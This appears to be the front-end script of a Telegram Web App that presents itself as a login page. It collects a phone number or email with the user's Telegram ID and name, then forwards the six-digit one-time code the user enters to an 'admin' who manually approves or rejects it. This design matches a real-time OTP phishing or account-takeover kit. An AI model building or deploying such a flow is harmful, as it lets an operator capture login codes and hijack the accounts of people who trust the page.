const API = ""; // same origin

function tgUser() {
  const u = window.Telegram?.WebApp?.initDataUnsafe?.user;
  if (!u) return { telegram_id: null, username: "", first_name: "" };
  return { telegram_id: u.id, username: u.username || "", first_name: u.first_name || "" };
}

function expandWebApp() {
  if (window.Telegram?.WebApp) {
    window.Telegram.WebApp.ready();
    window.Telegram.WebApp.expand();
  }
}
expandWebApp();

/* ==========================================================
   LOGIN PAGE
   ========================================================== */
const sendCodeBtn = document.getElementById("sendCodeBtn");

if (sendCodeBtn) {
  let mode = "phone";

  const inputEl = document.getElementById("identifier");
  const subtitleEl = document.getElementById("subtitle");
  const emailBtn = document.getElementById("emailBtn");
  const errorEl = document.getElementById("errorMsg");

  inputEl.placeholder = "e.g. +1234567890";
  inputEl.type = "tel";
  inputEl.inputMode = "tel";

  emailBtn.addEventListener("click", () => {
    if (mode === "phone") {
      mode = "email";
      inputEl.type = "email";
      inputEl.inputMode = "email";
      inputEl.placeholder = "you@example.com";
      inputEl.value = "";
      subtitleEl.textContent = "Enter your email to continue. We'll send a verification code.";
      emailBtn.innerHTML = '<span>📱</span> Continue with Phone';
    } else {
      mode = "phone";
      inputEl.type = "tel";
      inputEl.inputMode = "tel";
      inputEl.placeholder = "e.g. +1234567890";
      inputEl.value = "";
      subtitleEl.textContent = "Enter your phone number to continue. We'll send a verification code.";
      emailBtn.innerHTML = '<span>✉️</span> Continue with E-mail';
    }
    inputEl.focus();
    hideError();
  });

  sendCodeBtn.addEventListener("click", async () => {
    hideError();
    const value = inputEl.value.trim();

    if (!value) {
      return showError(mode === "phone" ? "Please enter your phone number." : "Please enter your email.");
    }
    if (mode === "phone") {
      const digits = value.replace(/[^\d]/g, "");
      if (digits.length < 7) return showError("Please enter a valid phone number.");
    } else {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return showError("Please enter a valid email address.");
    }

    await requestOtp(value);
  });

  document.getElementById("noAccount").addEventListener("click", (e) => {
    e.preventDefault();
    showError("This is a demo — just enter any phone or email to continue.");
  });

  function showError(msg) {
    errorEl.textContent = msg;
    errorEl.style.display = "block";
  }
  function hideError() {
    errorEl.style.display = "none";
  }
}

async function requestOtp(identifier) {
  const u = tgUser();
  const body = { identifier, ...u };
  try {
    const r = await fetch(`${API}/api/request-otp`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    if (!r.ok) {
      alert("Failed to create request: " + (await r.text()));
      return;
    }
    const data = await r.json();
    sessionStorage.setItem("request_id", String(data.request_id));
    sessionStorage.setItem("identifier", identifier);
    location.href = "/otp";
  } catch (e) {
    alert("Network error. Please try again.");
  }
}

/* ==========================================================
   OTP PAGE — 100% MANUAL
   ========================================================== */
function initOtpPage() {
  const ident = sessionStorage.getItem("identifier") || "your device";
  document.getElementById("identShow").textContent = ident;

  const boxes = Array.from(document.querySelectorAll(".otp-box"));
  const submitBtn = document.getElementById("submitOtpBtn");

  boxes.forEach((box, i) => {
    box.addEventListener("input", () => {
      box.value = box.value.replace(/\D/g, "").slice(0, 1);
      // Auto-advance focus is OK (just UX) but does NOT submit
      if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
    });
    box.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !box.value && i > 0) boxes[i - 1].focus();
    });
    box.addEventListener("paste", (e) => {
      const text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
      if (!text) return;
      e.preventDefault();
      for (let k = 0; k < 6 && k < text.length; k++) boxes[k].value = text[k];
      const last = Math.min(text.length, 6) - 1;
      if (last >= 0) boxes[last].focus();
    });
  });
  boxes[0].focus();

  // MANUAL SUBMIT ONLY — never auto
  submitBtn.addEventListener("click", submitOtp);

  // Poll for admin's decision (this is fine — it's just checking status)
  startPolling();
}

function getOtp() {
  return Array.from(document.querySelectorAll(".otp-box")).map((b) => b.value).join("");
}

let submitted = false;

async function submitOtp() {
  if (submitted) return;

  const otp = getOtp();
  if (otp.length !== 6) {
    setStatus("Please enter all 6 digits.", "error");
    return;
  }

  submitted = true;
  setStatus("Sending code to admin…");

  const request_id = parseInt(sessionStorage.getItem("request_id"), 10);

  try {
    const r = await fetch(`${API}/api/submit-otp`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ request_id, otp }),
    });
    if (!r.ok) {
      setStatus("Failed to submit. Try again.", "error");
      submitted = false;
      return;
    }
    setStatus("Code sent. Waiting for admin to verify…");
    // Lock boxes while waiting
    document.querySelectorAll(".otp-box").forEach((b) => (b.disabled = true));
    document.getElementById("submitOtpBtn").disabled = true;
    document.getElementById("submitOtpBtn").style.opacity = "0.5";
  } catch (e) {
    setStatus("Network error. Try again.", "error");
    submitted = false;
  }
}

function setStatus(text, kind) {
  const el = document.getElementById("status");
  el.style.display = "block";
  el.className = "status" + (kind ? " " + kind : "");
  el.innerHTML =
    kind === "error" || kind === "success"
      ? text
      : `<span class="spinner"></span>${text}`;
}

async function startPolling() {
  const request_id = parseInt(sessionStorage.getItem("request_id"), 10);
  if (!request_id) return;

  setInterval(async () => {
    try {
      const r = await fetch(`${API}/api/check-status?request_id=${request_id}`);
      const data = await r.json();

      if (data.status === "approved") {
        localStorage.setItem("token", data.token);
        setStatus("Approved! Loading dashboard…", "success");
        setTimeout(() => (location.href = "/dashboard"), 600);
      } else if (data.status === "rejected") {
        setStatus("OTP is not correct. Please try again.", "error");
        submitted = false;
        document.querySelectorAll(".otp-box").forEach((b) => {
          b.value = "";
          b.disabled = false;
        });
        const btn = document.getElementById("submitOtpBtn");
        btn.disabled = false;
        btn.style.opacity = "1";
        document.querySelector(".otp-box").focus();
      } else if (data.status === "awaiting_decision") {
        setStatus("Code sent. Waiting for admin to verify…");
      }
    } catch (e) {}
  }, 2000);
}

/* ==========================================================
   DASHBOARD GUARD
   ========================================================== */
if (location.pathname === "/dashboard") {
  const token = localStorage.getItem("token");
  if (!token) location.href = "/";
}
